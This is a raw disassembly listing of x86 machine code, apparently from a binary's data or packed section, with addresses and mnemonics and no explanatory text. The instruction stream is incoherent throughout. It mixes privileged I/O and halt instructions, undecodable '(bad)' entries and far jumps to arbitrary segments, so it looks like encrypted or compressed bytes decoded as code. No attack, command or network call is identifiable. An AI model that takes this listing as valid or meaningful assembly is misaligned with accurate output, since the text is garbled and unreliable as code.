  41f209:	loop   0x41f1c2
  41f20b:	push   es
  41f20c:	cwde   
  41f20d:	pop    edx
  41f20e:	push   edx
  41f20f:	fstp   DWORD PTR [ecx-0x7f7a903a]
  41f215:	mov    eax,0xf4a1cabd
  41f21a:	xchg   ebx,eax
  41f21b:	ror    ch,cl
  41f21d:	shl    BYTE PTR [ecx],cl
  41f21f:	shl    DWORD PTR [ecx],1
  41f221:	xchg   BYTE PTR ds:[eax+0x183d837e],dh
  41f228:	icebp  
  41f229:	mov    ebx,0x52d6f5ad
  41f22e:	sub    BYTE PTR [esi-0x6e],0xdb
  41f232:	and    eax,0x70096755
  41f237:	adc    dl,BYTE PTR [eax-0x1c]
  41f23a:	call   0x7572:0xac5f32e3
  41f241:	inc    esp
  41f242:	push   ebp
  41f243:	inc    BYTE PTR [esp+ecx*4]
  41f246:	xchg   edx,eax
  41f247:	mov    edi,0xb3746b40
  41f24c:	dec    esi
  41f24d:	sbb    DWORD PTR [eax],esi
  41f24f:	pop    es
  41f250:	ins    DWORD PTR es:[edi],dx
  41f251:	out    dx,eax
  41f252:	sub    ch,dh
  41f254:	(bad)  
  41f255:	dec    ecx
  41f256:	pop    ecx
  41f257:	mov    BYTE PTR [ebp+edi*4-0x5c],al
  41f25b:	hlt    
  41f25c:	mov    dh,0xac
  41f25e:	xlat   BYTE PTR ds:[ebx]
  41f25f:	mov    ch,0xb9
  41f261:	jno    0x41f1e5
  41f263:	inc    esp
  41f264:	or     bh,BYTE PTR [ebp-0x58]
  41f267:	mov    ebp,0x521efa6c
  41f26c:	shl    DWORD PTR [ecx-0x55],0xb9
  41f270:	dec    ebx
  41f271:	into   
  41f272:	ja     0x41f270
  41f274:	fwait
  41f275:	adc    al,0x92
  41f277:	ret    
  41f278:	sti    
  41f279:	jle    0x72e8ec43
  41f27f:	fistp  QWORD PTR [esi-0x326d48a2]
  41f285:	test   al,0x72
  41f287:	jne    0x41f2b7
  41f289:	cmp    ecx,DWORD PTR [esp+eax*1-0x6b]
  41f28d:	outs   dx,BYTE PTR ds:[esi]
  41f28e:	xchg   DWORD PTR [ecx+0xf524f4f],ebx
  41f294:	fldcw  WORD PTR [edx-0x389c2740]
  41f29a:	js     0x41f317
  41f29c:	clc    
  41f29d:	imul   edi,DWORD PTR [eax+0x67587202],0x47e913e5
  41f2a7:	pushf  
  41f2a8:	sbb    edx,esp
  41f2aa:	out    dx,eax
  41f2ab:	popa   
  41f2ac:	pusha  
  41f2ad:	xor    ecx,ecx
  41f2af:	or     al,0x53
  41f2b1:	mov    edx,0x3b017c78
  41f2b6:	pushf  
  41f2b7:	inc    esp
  41f2b8:	mov    BYTE PTR [ebx+0x30],al
  41f2bb:	retf   0xb4a7
  41f2be:	mov    BYTE PTR [eax],dh
  41f2c0:	into   
  41f2c1:	or     bl,BYTE PTR [esp+edx*4]
  41f2c4:	dec    ebx
  41f2c5:	mov    bh,dh
  41f2c7:	arpl   ax,di
  41f2c9:	sbb    ch,BYTE PTR [edi+0x5b4b1bcf]
  41f2cf:	xchg   BYTE PTR [edx*8-0x74c9cb36],ah
  41f2d6:	adc    DWORD PTR [edi+edx*2+0x7a781dc],edx
  41f2dd:	(bad)  
  41f2df:	jp     0x41f2b6
  41f2e1:	fwait
  41f2e2:	ror    BYTE PTR [ecx],cl
  41f2e4:	cs push es
  41f2e6:	sbb    eax,0xcd5d8a15
  41f2eb:	test   al,ch
  41f2ed:	neg    BYTE PTR [edi-0x2d]
  41f2f0:	add    bl,BYTE PTR [ebx-0x504782bb]
  41f2f6:	xchg   esp,eax
  41f2f7:	data16 xor BYTE PTR [ebx],dl
  41f2fa:	mov    ds:0x5a79e9e4,eax
  41f2ff:	popa   
  41f300:	mov    ecx,0xa182636b
  41f305:	in     al,dx
  41f306:	mov    bl,0x79
  41f308:	pop    eax
  41f309:	lahf   
  41f30a:	in     eax,dx
  41f30b:	dec    ebp
  41f30c:	add    DWORD PTR [ecx+0x23],ebp
  41f30f:	sbb    al,BYTE PTR [eax]
  41f311:	fstp   DWORD PTR [esi]
  41f313:	dec    eax
  41f314:	(bad)  
  41f315:	mov    dl,0x97
  41f317:	push   es
  41f318:	pop    eax
  41f319:	fld    QWORD PTR [edi]
  41f31b:	mov    ds:0xf9763393,eax
  41f320:	sar    BYTE PTR [eax],cl
  41f322:	std    
  41f323:	xor    BYTE PTR [ebp-0x2693298a],ah
  41f329:	mov    ebp,0x8a6e84dd
  41f32e:	ret    0xc9f6
  41f331:	xchg   edx,eax
  41f332:	add    esi,DWORD PTR [edx-0x4bb2030d]
  41f338:	iret   
  41f339:	outs   dx,DWORD PTR ds:[esi]
  41f33a:	sub    dl,al
  41f33c:	ss jl  0x41f383
  41f33f:	inc    edi
  41f340:	mov    ch,0x43
  41f342:	xchg   BYTE PTR [ebx-0x12],ah
  41f345:	mov    esp,DWORD PTR ds:0xd4c45651
  41f34b:	(bad)  
  41f34c:	mov    WORD PTR [ebx],es
  41f34e:	fild   QWORD PTR fs:[esi-0x38]
  41f352:	ds adc al,0x82
  41f355:	xor    edx,eax
  41f357:	call   0x4de9bd4
  41f35c:	xor    ebx,ebp
  41f35e:	jmp    0x41f3dc
  41f360:	adc    ah,BYTE PTR [eax+0x16c100b3]
  41f366:	dec    edx
  41f367:	xlat   BYTE PTR ds:[ebx]
  41f368:	push   0xffffff80
  41f36a:	shl    DWORD PTR [ecx],0xd5
  41f36d:	fst    QWORD PTR [ebx-0x644cc763]
  41f373:	xchg   BYTE PTR [ecx+0x3d],cl
  41f376:	inc    edx
  41f377:	div    edx
  41f379:	mov    dh,0x90
  41f37b:	fidiv  WORD PTR [edx+0x5449346b]
  41f381:	les    ebx,FWORD PTR fs:0xe3aafb62
  41f388:	mov    edx,DWORD PTR [ecx]
  41f38a:	jp     0x41f404
  41f38c:	dec    esi
  41f38d:	ja     0x41f347
  41f38f:	ins    BYTE PTR es:[edi],dx
  41f390:	adc    DWORD PTR ds:0x4ac7ffb7,eax
  41f396:	push   0x7b1faf26
  41f39b:	xchg   ch,dh
  41f39d:	into   
  41f39e:	ins    DWORD PTR es:[edi],dx
  41f39f:	xor    DWORD PTR [edi-0x4c],esi
  41f3a2:	fnstenv [ecx-0x46]
  41f3a5:	loope  0x41f3c0
  41f3a7:	push   0x54ae9c95
  41f3ac:	or     BYTE PTR [ebp-0x6f660619],al
  41f3b2:	xchg   esi,eax
  41f3b3:	xor    BYTE PTR [eax-0x71],ch
  41f3b6:	sub    DWORD PTR [edx],0x91bc64bc
  41f3bc:	sub    ch,BYTE PTR [edi-0x78]
  41f3bf:	jne    0x41f354
  41f3c1:	mov    ch,0xcb
  41f3c3:	dec    ebp
  41f3c4:	jne    0x41f404
  41f3c6:	fst    QWORD PTR [ebx]
  41f3c8:	mov    BYTE PTR [eax],bl
  41f3ca:	test   BYTE PTR [eax+0x78],0xe6
  41f3ce:	scas   al,BYTE PTR es:[edi]
  41f3cf:	(bad)  
  41f3d0:	sub    BYTE PTR [esi-0x2],ah
  41f3d3:	pop    edx
  41f3d4:	mov    ds:0x79cbf1cf,al
  41f3d9:	jno    0x41f424
  41f3db:	dec    esi
  41f3dc:	push   0x5dd7fb7a
  41f3e1:	mov    esp,0x2c106b2e
  41f3e6:	bound  esi,QWORD PTR [ecx+eiz*8-0x14]
  41f3ea:	jno    0x41f3cc
  41f3ec:	stos   DWORD PTR es:[edi],eax
  41f3ed:	push   ss
  41f3ee:	dec    esi
  41f3ef:	fidivr DWORD PTR [edi-0x182931f2]
  41f3f5:	cmp    ecx,eax
  41f3f7:	pusha  
  41f3f8:	out    0xf,eax
  41f3fa:	test   DWORD PTR [ecx+esi*4-0x62002693],ebp
  41f401:	mov    ?,edi
  41f403:	sbb    ebx,ebx
  41f405:	lds    edi,FWORD PTR [edx]
  41f407:	leave  
  41f408:	js     0x41f3a2
  41f40a:	sub    edi,DWORD PTR [edx]
  41f40c:	or     BYTE PTR [ecx],bh
  41f40e:	jno    0x41f47b
  41f410:	xor    DWORD PTR [ecx],0xfffffff6
  41f413:	les    ebp,FWORD PTR [ecx-0x68]
  41f416:	icebp  
  41f417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f418:	mov    gs,eax
  41f41a:	mov    al,0xf0
  41f41c:	xchg   ebx,eax
  41f41d:	cmp    ebx,ebx
  41f41f:	(bad)  
  41f420:	out    dx,al
  41f421:	add    BYTE PTR [ebx],dh
  41f423:	mov    al,0x9
  41f425:	call   0xdbd7055
  41f42a:	jle    0x41f488
  41f42c:	mov    ebp,0xd051db64
  41f431:	fldenv [eax]
  41f433:	icebp  
  41f434:	dec    edx
  41f435:	fst    QWORD PTR [ebp-0x42]
  41f438:	sub    DWORD PTR [eax+0x2],ecx
  41f43b:	ret    
  41f43c:	stos   DWORD PTR es:[edi],eax
  41f43d:	pop    esp
  41f43e:	add    ch,dl
  41f440:	mov    ecx,0xce298d9b
  41f445:	adc    eax,ebx
  41f447:	xchg   esi,eax
  41f448:	in     eax,0x7a
  41f44a:	ficomp DWORD PTR [esi-0x65]
  41f44d:	imul   ebx,esp,0x5fb4efb9
  41f453:	mov    eax,0xdf94ebe0
  41f458:	enter  0xad6a,0xa1
  41f45c:	pop    ecx
  41f45d:	jle    0x41f405
  41f45f:	dec    ebx
  41f460:	jmp    0x322c:0x78c34a4
  41f467:	scas   al,BYTE PTR es:[edi]
  41f468:	mov    dl,dl
  41f46a:	shr    BYTE PTR [edi+0x18],cl
  41f46d:	sub    BYTE PTR [ecx],0xd7
  41f470:	lods   al,BYTE PTR ds:[esi]
  41f471:	add    ch,0x7a
  41f474:	pushf  
  41f475:	js     0x41f489
  41f477:	mov    ds:0xe7010b22,al
  41f47c:	stos   BYTE PTR es:[edi],al
  41f47d:	outs   dx,DWORD PTR ds:[esi]
  41f47e:	cmp    ebp,ebp
  41f480:	xchg   BYTE PTR [esi+ecx*4],cl
  41f483:	test   DWORD PTR [edi],esp
  41f485:	push   0x807d34f1
  41f48a:	inc    esi
  41f48b:	cdq    
  41f48c:	call   0x1537a735
  41f491:	es out 0x63,eax
  41f494:	inc    edx
	...
  41f511:	add    BYTE PTR [eax],al
  41f513:	add    BYTE PTR [edx+0xc],ch
  41f516:	lea    ebx,[eax-0x1806611]
  41f51c:	into   
  41f51d:	out    dx,al
  41f51e:	popf   
  41f51f:	adc    esp,DWORD PTR [ebx-0x76f51444]
  41f525:	mov    es,WORD PTR [ecx]
  41f527:	add    BYTE PTR [ecx+0x7],ch
  41f52a:	add    BYTE PTR [eax],al
  41f52c:	xchg   BYTE PTR [ebp-0x7fc8cb22],bl
  41f532:	sbb    DWORD PTR [ebx],edi
  41f534:	sbb    ah,BYTE PTR [ebx-0x1c]
  41f537:	into   
  41f538:	add    ch,BYTE PTR [ebp-0x402b1034]
  41f53e:	aaa    
  41f53f:	xchg   ecx,eax
  41f540:	pop    eax
  41f541:	xchg   cl,bl
  41f543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f544:	mov    al,0xdd
  41f546:	ss add al,0xaa
  41f549:	adc    BYTE PTR [eax-0x79a203a8],ah
  41f54f:	aam    0x8d
  41f551:	dec    edi
  41f552:	xor    edx,eax
  41f554:	mov    dh,0x6d
  41f556:	mov    cl,dh
  41f558:	(bad)  
  41f559:	mov    eax,0x78248bc0
  41f55e:	cmp    eax,DWORD PTR [edx+0x12c621a9]
  41f564:	lods   eax,DWORD PTR ds:[esi]
  41f565:	dec    edx
  41f566:	int3   
  41f567:	mov    ch,0xad
  41f569:	and    BYTE PTR [ebp-0x7e8429a5],dh
  41f56f:	inc    esi
  41f570:	scas   al,BYTE PTR es:[edi]
  41f571:	mov    ah,0xc9
  41f573:	xchg   esi,eax
  41f574:	mov    ebx,0xb1f6dcf8
  41f579:	ret    0xbf17
  41f57c:	cmp    al,0xa
  41f57e:	xchg   ebx,eax
  41f57f:	jae    0x41f5ba
  41f581:	popf   
  41f582:	scas   eax,DWORD PTR es:[edi]
  41f583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f584:	mov    al,0xbd
  41f586:	xchg   ebp,eax
  41f587:	aam    0xba
  41f589:	jae    0x41f58e
  41f58b:	jge    0x41f5bd
  41f58d:	aaa    
  41f58e:	in     eax,0x29
  41f590:	call   0xbbde:0x20e7dd35
  41f597:	dec    edx
  41f598:	push   0x36
  41f59a:	sub    al,0x5d
  41f59c:	clc    
  41f59d:	clc    
  41f59e:	adc    ecx,DWORD PTR [ebx]
  41f5a0:	add    DWORD PTR [ebx+esi*8+0x40],edi
  41f5a4:	into   
  41f5a5:	xchg   esp,eax
  41f5a6:	xlat   BYTE PTR ds:[ebx]
  41f5a7:	cld    
  41f5a8:	mov    ecx,0x916eeee3
  41f5ad:	xor    ch,BYTE PTR [ecx+0x4e691bf6]
  41f5b3:	pop    eax
  41f5b4:	loop   0x41f619
  41f5b6:	push   ds
  41f5b7:	jo     0x41f5d1
  41f5b9:	or     al,0xe3
  41f5bb:	sub    BYTE PTR [edx-0x7a],ah
  41f5be:	enter  0x1c02,0x7a
  41f5c2:	sbb    eax,0xbb41d335
  41f5c7:	fisttp DWORD PTR [ebp+0x5b]
  41f5ca:	pop    edi
  41f5cb:	xchg   esi,eax
  41f5cc:	cli    
  41f5cd:	dec    ecx
  41f5ce:	mov    bh,0x7b
  41f5d0:	aam    0xfd
  41f5d2:	mov    ah,0x2a
  41f5d4:	push   0x7fa71e9
  41f5d9:	test   ebp,esi
  41f5db:	xor    ah,BYTE PTR [ebx-0x40]
  41f5de:	nop
  41f5df:	and    BYTE PTR ds:0x445c48c2,cl
  41f5e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5e6:	hlt    
  41f5e7:	ja     0x41f645
  41f5e9:	pusha  
  41f5ea:	je     0x41f5d2
  41f5ec:	mov    ebx,0x647122c4
  41f5f1:	test   BYTE PTR [ecx],dh
  41f5f3:	cli    
  41f5f4:	mov    bl,0xbd
  41f5f6:	iret   
  41f5f7:	call   0x88ea1084
  41f5fc:	xchg   ebx,eax
  41f5fd:	mov    al,0x24
  41f5ff:	mov    esp,0x1279267b
  41f604:	jnp    0x41f647
  41f606:	mov    bl,0x20
  41f608:	jns    0x41f5f6
  41f60a:	inc    ebx
  41f60b:	jns    0x41f633
  41f60d:	or     dh,0xc4
  41f610:	add    edx,DWORD PTR [esi]
  41f612:	mov    edx,0xe40c5d45
  41f617:	pop    edi
  41f618:	mov    al,0x81
  41f61a:	inc    esi
  41f61b:	test   al,0xff
  41f61d:	adc    al,0x3a
  41f61f:	ins    BYTE PTR es:[edi],dx
  41f620:	inc    ebp
  41f621:	ss out 0x4f,al
  41f624:	inc    esi
  41f625:	imul   esi,DWORD PTR [ebx-0x65e3266],0x6f7ab48c
  41f62f:	jnp    0x41f625
  41f631:	ins    BYTE PTR es:[edi],dx
  41f632:	(bad)  
  41f633:	(bad)  ds:0x63cb828b
  41f639:	xor    DWORD PTR [esi+0x6227ac18],ebx
  41f63f:	xchg   ecx,eax
  41f640:	pushf  
  41f641:	rcr    dl,cl
  41f643:	out    0x5e,al
  41f645:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41f647:	mov    BYTE PTR ds:0x35067aca,bl
  41f64d:	loopne 0x41f5dd
  41f64f:	clc    
  41f650:	sub    BYTE PTR [edx+ecx*2-0x6d],ah
  41f654:	pop    ebx
  41f655:	dec    edi
  41f656:	das    
  41f657:	fmul   st(4),st
  41f659:	or     DWORD PTR [ebp+0x1d9e8ba5],edi
  41f65f:	xchg   edi,eax
  41f660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f661:	out    0x7c,al
  41f663:	clc    
  41f664:	and    BYTE PTR [ecx-0x5b],ah
  41f667:	inc    ebx
  41f668:	iret   
  41f669:	icebp  
  41f66a:	enter  0xaef0,0xb3
  41f66e:	mov    ecx,0x544b8c64
  41f673:	lock cmp BYTE PTR [edx-0x13],0x5f
  41f678:	sbb    ebp,DWORD PTR [edi+0x733bb4e4]
  41f67e:	in     al,dx
  41f67f:	adc    al,0x92
  41f681:	push   esi
  41f682:	jle    0x41f6f5
  41f684:	ins    BYTE PTR es:[edi],dx
  41f685:	pop    ds
  41f686:	and    cl,BYTE PTR [eax]
  41f688:	or     al,dh
  41f68a:	enter  0x184d,0x14
  41f68e:	and    eax,0xcfec38e7
  41f693:	lahf   
  41f694:	test   BYTE PTR [ebp+0x4c978f74],ah
  41f69a:	xor    eax,0xabc5d1da
  41f69f:	popf   
  41f6a0:	jne    0x41f6c2
  41f6a2:	pop    es
  41f6a3:	out    0xdf,eax
  41f6a5:	int3   
  41f6a6:	dec    ebx
  41f6a7:	neg    DWORD PTR [eax+ecx*4+0x5d]
  41f6ab:	push   edx
  41f6ac:	inc    esi
  41f6ad:	(bad)  [edi+0x58]
  41f6b0:	or     al,0x1e
  41f6b2:	ss clc 
  41f6b4:	pop    ecx
  41f6b5:	call   0x7fb8ae5f
  41f6ba:	sbb    BYTE PTR ds:0x61eb3031,dh
  41f6c0:	in     eax,0x42
  41f6c2:	js     0x41f6e4
  41f6c4:	ins    BYTE PTR es:[edi],dx
  41f6c5:	int    0x1e
  41f6c7:	aas    
  41f6c8:	or     eax,0xe4eae34e
  41f6cd:	sbb    BYTE PTR [edx+0x12138345],bh
  41f6d3:	adc    ch,BYTE PTR [ebx-0xe]
  41f6d6:	mov    ecx,0x95f5b9e2
  41f6db:	shr    BYTE PTR [edx],cl
  41f6dd:	pop    ebx
  41f6de:	mov    bh,0xf9
  41f6e0:	clc    
  41f6e1:	pop    ds
  41f6e2:	out    dx,eax
  41f6e3:	and    ch,BYTE PTR [ecx]
  41f6e5:	xchg   bl,bl
  41f6e7:	fsub   DWORD PTR [esp+eax*4-0x11]
  41f6eb:	and    eax,0x468a8c7a
  41f6f0:	jcxz   0x41f6be
  41f6f3:	jne    0x41f750
  41f6f5:	(bad)  
  41f6f7:	mov    ebx,0x310ca5a4
  41f6fc:	jmp    0xf155:0xb8a82009
  41f703:	arpl   WORD PTR [esi-0x6c],bp
  41f706:	mov    ebp,eax
  41f708:	das    
  41f709:	ins    BYTE PTR es:[edi],dx
  41f70a:	addr16 shr al,0x9e
  41f70e:	add    cl,BYTE PTR [eax-0xa]
  41f711:	cmp    ah,0xb
  41f714:	xchg   ebx,eax
  41f715:	dec    eax
  41f716:	inc    eax
  41f717:	neg    BYTE PTR [ebp+eiz*8+0x6c]
  41f71b:	sbb    ch,0x1
  41f71e:	cs inc ebx
  41f720:	(bad)  
  41f721:	repnz push es
  41f723:	rcr    dh,1
  41f725:	or     eax,ebx
  41f727:	mov    ?,WORD PTR ds:0x31d3685
  41f72d:	repz jns 0x41f6bc
  41f730:	cmp    al,0xc6
  41f732:	dec    edx
  41f733:	cwde   
  41f734:	cwde   
  41f735:	push   ebx
  41f736:	les    sp,DWORD PTR [edi]
  41f739:	fild   WORD PTR [ecx-0x3b]
  41f73c:	shl    DWORD PTR [edi-0x6dc990e0],0xa2
  41f743:	mov    eax,0x1770036e
  41f748:	mov    ch,0xb
  41f74a:	retf   
  41f74b:	dec    eax
  41f74c:	(bad)  
  41f74d:	aaa    
  41f74e:	mov    eax,0xf5265e48
  41f753:	pop    edi
  41f754:	mov    edx,0x305b3744
  41f759:	ror    ch,0x13
  41f75c:	or     ebp,esp
  41f75e:	cmc    
  41f75f:	hlt    
  41f760:	out    0x74,eax
  41f762:	aad    0x3
  41f764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f765:	rcl    edi,0x60
  41f768:	gs push ss
  41f76a:	adc    dh,al
  41f76c:	dec    ecx
  41f76d:	data16 sbb dl,BYTE PTR [ebx+esi*2+0x2e]
  41f772:	inc    edx
  41f773:	(bad)  
  41f774:	pop    ecx
  41f775:	int3   
  41f776:	inc    edi
  41f777:	sbb    DWORD PTR [esp+edi*4+0x31],0x115b93b8
  41f77f:	jmp    0xbcf45358
  41f784:	jae    0x41f721
  41f786:	out    0xcb,al
  41f788:	push   esp
  41f789:	sbb    eax,0x784e2025
  41f78e:	das    
  41f78f:	mov    bl,0xca
  41f791:	lods   eax,DWORD PTR ds:[esi]
  41f792:	les    esp,FWORD PTR [edx-0x11]
  41f795:	ja     0x41f755
  41f797:	fwait
  41f798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f799:	push   esi
  41f79a:	jg     0x41f7f3
  41f79c:	cmp    esi,eax
  41f79e:	sub    BYTE PTR [ecx-0x27],dh
  41f7a1:	mov    al,0xf1
  41f7a3:	mov    gs,WORD PTR [edx+0x5f]
  41f7a6:	add    bh,BYTE PTR [ebx]
  41f7a8:	aaa    
  41f7a9:	mov    edi,0x9cf6cd6c
  41f7ae:	pop    ds
  41f7af:	jno    0x41f7df
  41f7b1:	xor    ecx,esp
  41f7b3:	jb     0x41f7b0
  41f7b5:	cmc    
  41f7b6:	pop    ds
  41f7b7:	loopne 0x41f749
  41f7b9:	and    eax,0x403d476b
  41f7be:	sar    DWORD PTR [edx],1
  41f7c0:	in     al,dx
  41f7c1:	push   cs
  41f7c2:	test   ecx,0x5c972b26
  41f7c8:	mov    cl,bl
  41f7ca:	pop    ebx
  41f7cb:	icebp  
  41f7cc:	inc    esp
  41f7cd:	jnp    0x41f7bb
  41f7cf:	pop    esp
  41f7d0:	sbb    BYTE PTR [edx+0x10d438a8],bh
  41f7d6:	outs   dx,DWORD PTR ds:[esi]
  41f7d7:	nop
  41f7d8:	pop    esp
  41f7d9:	adc    DWORD PTR [edx],ebp
  41f7db:	xchg   cl,dl
  41f7dd:	popf   
  41f7de:	aam    0x12
  41f7e0:	cs mov edx,ss
  41f7e3:	jecxz  0x41f834
  41f7e5:	lods   eax,DWORD PTR es:[esi]
  41f7e7:	aas    
  41f7e8:	or     al,0x33
  41f7ea:	pop    ebp
  41f7eb:	and    BYTE PTR [esi-0x265bba8f],dh
  41f7f1:	pop    ebx
  41f7f2:	mov    ds:0x2ff783bf,al
  41f7f7:	mov    al,ds:0x3751dfd9
  41f7fc:	jno    0x41f7ca
  41f7fe:	pop    ds
  41f7ff:	shl    BYTE PTR [edx+0x70],0x63
  41f803:	fist   WORD PTR [eax-0x14]
  41f806:	das    
  41f807:	popf   
  41f808:	jne    0x41f7a3
  41f80a:	jb     0x41f826
  41f80c:	jmp    0x9d20:0xb217e865
  41f813:	daa    
  41f814:	mul    BYTE PTR [esi+esi*2+0x6bd53adc]
  41f81b:	loopne 0x41f7dd
  41f81d:	daa    
  41f81e:	into   
  41f81f:	out    dx,al
  41f820:	xchg   edi,eax
  41f821:	scas   al,BYTE PTR es:[edi]
  41f822:	dec    esi
  41f823:	fwait
  41f824:	or     ah,BYTE PTR [edx]
  41f826:	xor    cl,BYTE PTR [eax-0xf]
  41f829:	int3   
  41f82a:	aad    0x30
  41f82c:	in     eax,0xc4
  41f82e:	sbb    BYTE PTR [ebp+0x701fa655],dl
  41f834:	(bad)  
  41f835:	cmp    bl,BYTE PTR [eax+0x2ca81ce3]
  41f83b:	in     eax,dx
  41f83c:	out    0x23,eax
  41f83e:	pop    edx
  41f83f:	shl    edi,1
  41f841:	je     0x41f7dd
  41f843:	(bad)  
  41f844:	adc    cl,BYTE PTR [ecx+0x499b118e]
  41f84a:	jno    0x41f7f2
  41f84c:	fdivp  st(2),st
  41f84e:	rcr    DWORD PTR [ebx-0x2f257098],0x62
  41f855:	jno    0x41f805
  41f857:	and    DWORD PTR [edi-0x71],0x5e
  41f85b:	int    0x3d
  41f85d:	inc    ecx
  41f85e:	repnz inc ebp
  41f860:	sub    al,0xb0
  41f862:	stos   BYTE PTR es:[edi],al
  41f863:	div    BYTE PTR [ebp+0x3b646e35]
  41f869:	sbb    eax,0xbf7089d3
  41f86e:	pop    esi
  41f86f:	jge    0x41f88e
  41f871:	or     eax,0x32f6b941
  41f876:	std    
  41f877:	jmp    0x1e2a0481
  41f87c:	pusha  
  41f87d:	test   eax,0xe05bec6e
  41f882:	lds    ecx,FWORD PTR [ecx+ecx*8-0x65]
  41f886:	inc    ecx
  41f887:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41f889:	mov    ?,edx
  41f88b:	and    al,0xf4
  41f88d:	ds jns 0x41f815
  41f890:	add    BYTE PTR [ecx-0x4f],cl
  41f893:	jmp    0xc34e:0xaeeef784
  41f89a:	in     al,dx
  41f89b:	inc    edi
  41f89c:	ja     0x41f875
  41f89e:	mov    ds:0x1f49ee81,eax
  41f8a3:	inc    edx
  41f8a4:	mov    edx,0x15e129a4
  41f8a9:	pop    ebp
  41f8aa:	inc    esi
  41f8ab:	mov    ebp,0xbf52d60e
  41f8b0:	inc    ecx
  41f8b1:	shr    BYTE PTR [edi+0x70fd772f],0xc7
  41f8b8:	add    ebp,DWORD PTR [ebx-0x455ecb91]
  41f8be:	cdq    
  41f8bf:	sbb    BYTE PTR [edi],bh
  41f8c1:	push   ss
  41f8c2:	jge    0x41f8c3
  41f8c4:	sbb    al,0x66
  41f8c6:	mov    esp,0x450e5928
  41f8cb:	clc    
  41f8cc:	pop    edi
  41f8cd:	loop   0x41f8d0
  41f8cf:	ja     0x41f8f5
  41f8d1:	mov    DWORD PTR [esi-0x1f473499],edi
  41f8d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8d8:	jns    0x41f8c1
  41f8da:	scas   al,BYTE PTR es:[edi]
  41f8db:	mov    esi,0x235b124d
  41f8e0:	test   DWORD PTR [ebx-0x4a49d837],eax
  41f8e6:	aad    0xdb
  41f8e8:	xchg   ecx,eax
  41f8e9:	push   ss
  41f8ea:	jnp    0x41f8d8
  41f8ec:	push   ebx
  41f8ed:	inc    ebp
  41f8ee:	hlt    
  41f8ef:	mov    eax,ds:0x645788f2
  41f8f4:	ins    DWORD PTR es:[edi],dx
  41f8f5:	dec    esp
  41f8f6:	stc    
  41f8f7:	(bad)  
  41f8f8:	out    0x82,al
  41f8fa:	dec    ebp
  41f8fb:	out    dx,al
  41f8fc:	mov    ds:0x977c3a8f,eax
  41f901:	and    esp,DWORD PTR [eax+0x73cb42b7]
  41f907:	pop    edi
  41f908:	call   0x683b:0x9f3581c4
  41f90f:	mov    WORD PTR [ecx-0x32a782d6],fs
  41f915:	cli    
  41f916:	imul   edx,DWORD PTR [edi+0x25fd3d67],0x69
  41f91d:	cmp    DWORD PTR [ecx-0x79160938],esp
  41f923:	xchg   esp,eax
  41f924:	xor    bl,BYTE PTR [ecx-0x59]
  41f927:	daa    
  41f928:	imul   esp,DWORD PTR [ebx],0x66816691
  41f92e:	sahf   
  41f92f:	call   0x4e06a4a4
  41f934:	data16 (bad) 
  41f936:	in     al,0xf4
  41f938:	inc    edx
  41f939:	jl     0x41f995
  41f93b:	test   BYTE PTR [edx-0x3902f61c],dl
  41f941:	test   al,0xf0
  41f943:	jae    0x41f989
  41f945:	popa   
  41f946:	pop    ebx
  41f947:	and    eax,0xf69c2055
  41f94c:	push   ebx
  41f94d:	aad    0x8d
  41f94f:	adc    ebp,edx
  41f951:	ins    BYTE PTR es:[edi],dx
  41f952:	jle    0x41f9b2
  41f954:	cmp    DWORD PTR [edx+0x3c63b5a3],edi
  41f95a:	inc    BYTE PTR [ebx]
  41f95c:	outs   dx,DWORD PTR ds:[esi]
  41f95d:	ret    0x19a
  41f960:	dec    ecx
  41f961:	test   eax,0xbd89cb65
  41f966:	mov    DWORD PTR [ecx+0x1fee334],ebp
  41f96c:	dec    edi
  41f96d:	or     al,BYTE PTR [esi]
  41f96f:	nop
  41f970:	jl     0x41f97a
  41f972:	pop    es
  41f973:	pop    ebp
  41f974:	mov    ebp,0x5594e9fe
  41f979:	pop    es
  41f97a:	and    eax,0x5a8e2fa3
  41f97f:	sahf   
  41f980:	or     al,0x16
  41f982:	popw   ds
  41f984:	clc    
  41f985:	fnsave [esi-0x50]
  41f988:	add    ecx,eax
  41f98a:	test   BYTE PTR [esi],dl
  41f98c:	fdiv   st,st(2)
  41f98e:	xor    cl,BYTE PTR ds:0xe19eef5d
  41f994:	int    0x50
  41f996:	cwde   
  41f997:	enter  0x9db0,0xa4
  41f99b:	les    ebp,FWORD PTR [edi-0x1d]
  41f99e:	cmp    BYTE PTR ds:0xc538ec3e,cl
  41f9a4:	repz push ebx
  41f9a6:	enter  0xe992,0xaf
  41f9aa:	cmp    eax,0x88a343a2
  41f9af:	pop    ss
  41f9b0:	test   al,ah
  41f9b2:	pop    ds
  41f9b3:	sti    
  41f9b4:	aaa    
  41f9b5:	fisttp WORD PTR [edi]
  41f9b7:	sub    esp,DWORD PTR [ebx+eiz*2]
  41f9ba:	and    DWORD PTR [edi+0x67bffb8f],0x75405b49
  41f9c4:	push   ds
  41f9c5:	mov    bl,bh
  41f9c7:	into   
  41f9c8:	mov    ebx,DWORD PTR [ebx]
  41f9ca:	(bad)  
  41f9cb:	(bad)  
  41f9cc:	shr    esi,1
  41f9ce:	popa   
  41f9cf:	pop    ss
  41f9d0:	mov    dl,dh
  41f9d2:	and    al,0xb6
  41f9d4:	or     dl,BYTE PTR [eax+0x33]
  41f9d7:	mov    ds:0x96ac2286,al
  41f9dc:	aaa    
  41f9dd:	ret    0x7b67
  41f9e0:	xchg   DWORD PTR [ebx+0x555296bd],eax
  41f9e6:	sbb    DWORD PTR [ecx+0x331eb29b],esi
  41f9ec:	in     al,0xaf
  41f9ee:	pop    es
  41f9ef:	out    0x42,al
  41f9f1:	push   edi
  41f9f2:	jmp    0x14f4:0x61e6c6c8
  41f9f9:	scas   eax,DWORD PTR es:[edi]
  41f9fa:	scas   eax,DWORD PTR es:[edi]
  41f9fb:	and    BYTE PTR [edi-0x38],al
  41f9fe:	xor    eax,0xcf8f372b
  41fa03:	shl    cl,1
  41fa05:	aad    0x50
